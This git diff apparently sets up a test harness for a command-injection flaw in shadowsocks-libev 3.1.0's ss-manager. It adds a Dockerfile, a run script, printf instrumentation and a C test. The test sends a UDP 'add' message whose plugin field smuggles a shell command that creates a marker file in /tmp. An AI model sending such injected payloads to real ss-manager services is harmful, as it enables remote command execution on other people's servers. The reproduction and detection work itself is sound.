diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..2c304a8
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,32 @@
+FROM ubuntu:20.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget git autoconf libtool libssl-dev libev-dev asciidoc xmlto automake pkg-config libpcre3-dev zlib1g-dev libsodium-dev libmbedtls-dev libc-ares-dev && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Create test directory
+RUN mkdir -p /test
+
+# Download and build the vulnerable version (3.1.0) of shadowsocks-libev
+RUN cd /tmp && \
+    wget https://github.com/shadowsocks/shadowsocks-libev/releases/download/v3.1.0/shadowsocks-libev-3.1.0.tar.gz && \
+    tar xf shadowsocks-libev-3.1.0.tar.gz && \
+    cd shadowsocks-libev-3.1.0 && \
+    ./configure --disable-documentation && \
+    make && \
+    make install
+
+# Make the test script executable
+RUN chmod +x /project/run_test.sh
+
+# Run the test
+CMD ["/project/run_test.sh"]
diff --git a/run_test.sh b/run_test.sh
new file mode 100644
index 0000000..87b1fc2
--- /dev/null
+++ b/run_test.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+
+# Compile the test program
+gcc -o /test/test_command_injection /project/test_command_injection.c
+
+# Create a directory for ss-manager to use
+mkdir -p /root/.shadowsocks
+
+# Start ss-manager in the background
+ss-manager -m aes-256-cfb --manager-address 127.0.0.1:8839 -v &
+MANAGER_PID=$!
+
+# Wait for ss-manager to start
+sleep 2
+
+# Run the test
+/test/test_command_injection
+TEST_RESULT=$?
+
+# Kill ss-manager
+kill $MANAGER_PID
+
+# Clean up
+rm -f /tmp/command_injection_successful
+
+# Exit with the test result
+exit $TEST_RESULT
diff --git a/src/manager.c b/src/manager.c
index f1d5dd1..b8967c1 100644
--- a/src/manager.c
+++ b/src/manager.c
@@ -94,6 +94,7 @@ destroy_server(struct server *server) {
 static void
 build_config(char *prefix, struct server *server)
 {
+    printf("[INSTRUMENTATION] build_config");
     char *path    = NULL;
     int path_size = strlen(prefix) + strlen(server->port) + 20;
 
@@ -123,6 +124,7 @@ build_config(char *prefix, struct server *server)
 static char *
 construct_command_line(struct manager_ctx *manager, struct server *server)
 {
+    printf("[INSTRUMENTATION] construct_command_line");
     static char cmd[BUF_SIZE];
     char *method = manager->method;
     int i;
@@ -472,6 +474,7 @@ check_port(struct manager_ctx *manager, struct server *server)
 static int
 add_server(struct manager_ctx *manager, struct server *server)
 {
+    printf("[INSTRUMENTATION] add_server");
     int ret = check_port(manager, server);
 
     if (ret == -1) {
diff --git a/test_command_injection.c b/test_command_injection.c
new file mode 100644
index 0000000..bd2d170
--- /dev/null
+++ b/test_command_injection.c
@@ -0,0 +1,91 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <errno.h>
+
+#define MANAGER_PORT 8839
+#define BUFFER_SIZE 2048
+
+// This function sends a UDP packet to the ss-manager with a payload that
+// attempts to exploit the command injection vulnerability
+int test_command_injection() {
+    int sockfd;
+    struct sockaddr_in servaddr;
+    
+    // Create socket
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("socket creation failed");
+        return 1;
+    }
+    
+    memset(&servaddr, 0, sizeof(servaddr));
+    
+    // Set server address
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(MANAGER_PORT);
+    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    
+    // Create a payload with command injection in the plugin field
+    // This will create a file at /tmp/command_injection_successful if the vulnerability exists
+    const char* payload = "add: {\"server_port\":\"8388\", \"password\":\"test\", \
+                          \"method\":\"aes-256-cfb\", \"plugin\":\"dummy;touch /tmp/command_injection_successful;\"}"; 
+    
+    printf("Sending payload: %s\n", payload);
+    
+    // Send the payload
+    if (sendto(sockfd, payload, strlen(payload), 0, 
+               (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
+        perror("sendto failed");
+        close(sockfd);
+        return 1;
+    }
+    
+    // Wait for a response
+    char recv_buffer[BUFFER_SIZE];
+    socklen_t len = sizeof(servaddr);
+    struct timeval tv;
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    
+    // Set socket timeout
+    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
+        perror("setsockopt failed");
+    }
+    
+    int n = recvfrom(sockfd, recv_buffer, BUFFER_SIZE, 0, 
+                    (struct sockaddr *)&servaddr, &len);
+    
+    if (n < 0) {
+        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+            printf("Timeout waiting for response\n");
+        } else {
+            perror("recvfrom failed");
+        }
+    } else {
+        recv_buffer[n] = '\0';
+        printf("Response: %s\n", recv_buffer);
+    }
+    
+    close(sockfd);
+    
+    // Wait a moment for the command to execute
+    sleep(2);
+    
+    // Check if the file was created
+    if (access("/tmp/command_injection_successful", F_OK) != -1) {
+        printf("VULNERABILITY DETECTED: Command injection successful!\n");
+        return 1; // Test fails if vulnerability exists
+    } else {
+        printf("No vulnerability detected.\n");
+        return 0; // Test passes if vulnerability does not exist
+    }
+}
+
+int main() {
+    return test_command_injection();
+}
